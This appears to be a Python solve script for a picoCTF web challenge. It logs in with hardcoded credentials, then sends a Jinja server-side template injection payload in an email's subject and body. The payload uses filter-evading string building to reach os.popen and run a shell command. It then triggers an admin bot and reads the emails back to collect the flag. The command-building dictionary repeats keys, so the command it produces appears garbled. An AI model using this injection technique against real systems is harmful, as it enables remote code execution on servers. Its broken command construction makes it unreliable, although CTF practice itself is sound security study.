import requests

url = "http://activist-birds.picoctf.net:51700"
headers = {}

# 1. Login y obtención del token
login_data = {"username": "user@ses", "password": "2f4167548ca5a3bdafc23ef1513cd9fd"}
response = requests.post(f"{url}/api/login", json=login_data)
token = response.json()
headers = {"token": token}
print(f"Token obtenido: {token}")

# 2. Payload SSTI (Inyectamos tanto en subject como en body por seguridad)
payload = "{{ self.__init__.__globals__.__builtins__.getattr(self.__init__.__globals__.__builtins__.__import__(dict(o=1,s=2).keys()|list|join), 'popen')(dict(c=1,a=2,t=3,f=4,l=5,a=6,g=7,d=8,t=9,x=10,t=11).keys()|list|join).read() }}"

email_data = {
    "to": "admin@ses",
    "subject": payload,
    "body": payload
}

# 3. Envío del email
resp_send = requests.post(f"{url}/api/send", json=email_data, headers=headers)
print(f"Email enviado. ID: {resp_send.text}")

# 4. Activar el admin_bot
print("Activando admin_bot...")
requests.post(f"{url}/api/admin_bot", headers=headers)

# 5. Consultar los emails para ver si el payload se ha ejecutado
print("Consultando emails para encontrar la flag...")
resp_emails = requests.get(f"{url}/api/emails", headers=headers)
print(resp_emails.json())
